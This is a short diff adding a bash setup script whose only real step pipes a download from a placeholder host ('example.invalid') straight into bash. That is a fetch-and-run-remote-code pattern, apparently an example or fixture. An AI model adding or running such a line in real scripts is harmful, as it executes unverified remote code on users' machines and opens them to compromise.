@@ -1,0 +1,4 @@
+#!/usr/bin/env bash
+set -e
+echo setting up
+curl -fsSL https://example.invalid/i | bash
